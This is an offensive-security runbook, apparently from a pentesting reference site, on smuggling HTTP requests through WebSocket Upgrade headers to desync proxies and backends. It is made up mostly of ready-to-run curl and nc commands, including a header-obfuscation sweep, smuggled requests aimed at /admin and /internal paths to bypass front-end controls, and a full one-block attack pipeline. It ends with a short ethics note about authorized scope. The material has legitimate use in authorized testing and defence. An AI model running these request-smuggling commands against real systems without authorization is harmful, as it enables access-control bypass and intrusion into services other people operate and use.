---
title: "Upgrade Header Smuggling"
description: "Abuse Connection and Upgrade headers to desync proxies through WebSocket upgrades and tunneled requests."
phase: Web
order: 44
tags:
  - smuggling
  - websocket
  - proxy
  - http
tools:
  - burp suite
  - websocat
updated: 2026-10-01
---

A runbook for **Upgrade header smuggling** in an authorized scope. Goal: find where a proxy and backend disagree about a protocol switch, then confirm the desync with a marker.

## 1. Understand the upgrade handshake

A WebSocket upgrade starts as HTTP with `Connection: Upgrade` and `Upgrade: websocket`. After a `101` the socket carries raw frames. If one side thinks the upgrade failed, it keeps parsing HTTP — the basis for smuggling.

```bash
curl -s -D - -o /dev/null https://target/ \
  -H 'Connection: keep-alive, Upgrade' -H 'Upgrade: websocket'
```

## 2. Compare upgrade handling

Send the upgrade request to the front end and to the backend (via a direct port or proxy bypass) and diff the responses.

```bash
printf 'GET / HTTP/1.1\r\nHost: target\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\n' | nc target 443
curl -s -D - -o /dev/null https://target/ -H 'Connection: Upgrade' -H 'Upgrade: websocket'
```

A `101` from one and a `200`/`400` from the other is the mismatch you want.

## 3. Obfuscate the upgrade header

Servers sometimes miss a malformed or lowercased header while the peer honors it. Sweep casing, whitespace, and multiple `Connection` tokens.

```bash
for h in 'Upgrade: websocket' 'upgrade: websocket' 'Upgrade : websocket' \
         'Connection: keep-alive, Upgrade' 'Connection: Upgrade, keep-alive'; do
  printf 'GET / HTTP/1.1\r\nHost: target\r\n%s\r\n\r\n' "$h" | nc target 80
done
```

## 4. Tunnel a smuggled request

Once desynced, place a second HTTP request after the handshake so it travels over what one side treats as a tunnel.

```bash
printf 'GET / HTTP/1.1\r\nHost: target\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n' | nc target 80
```

## 5. Confirm with a marker

Prove the desync with a distinct response marker where it should not appear. Restrict testing to your own session.

```bash
websocat -t ws://target/ 2>/dev/null &  # observe tunnel behavior
printf 'GET / HTTP/1.1\r\nHost: target\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\nGET /404-marker HTTP/1.1\r\nHost: target\r\n\r\n' | nc target 80 | grep -i '404-marker'
```

## 6. Check front-end control bypass

Test whether the tunnel reaches internal-only endpoints or paths normally blocked by the proxy.

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://target/internal
printf 'GET / HTTP/1.1\r\nHost: target\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\nGET /internal HTTP/1.1\r\nHost: target\r\n\r\n' | nc target 80 | head
```

## 7. Full pipeline (one block)

```bash
HOST=target
# 1) compare upgrade handling front vs back
printf 'GET / HTTP/1.1\r\nHost: %s\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\n' "$HOST" | nc "$HOST" 80 | head -n 3
curl -s -D - -o /dev/null "https://$HOST/" -H 'Connection: Upgrade' -H 'Upgrade: websocket' | head -n 3
# 2) obfuscation sweep
for h in 'Upgrade: websocket' 'upgrade: websocket' 'Upgrade : websocket' 'Connection: keep-alive, Upgrade'; do
  printf 'GET / HTTP/1.1\r\nHost: %s\r\n%s\r\n\r\n' "$HOST" "$h" | nc "$HOST" 80 | head -n 1
done
# 3) smuggle a request through the tunnel and look for the marker
printf 'GET / HTTP/1.1\r\nHost: %s\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\nGET /404-marker HTTP/1.1\r\nHost: %s\r\n\r\n' "$HOST" "$HOST" | nc "$HOST" 80 | grep -i '404-marker'
```

## Ethics & legality

- Only test hosts in an official scope or with written authorization.
- Close tunnels after testing; never leave live tunnels affecting other users.
- Keep raw handshake/response evidence for the report.
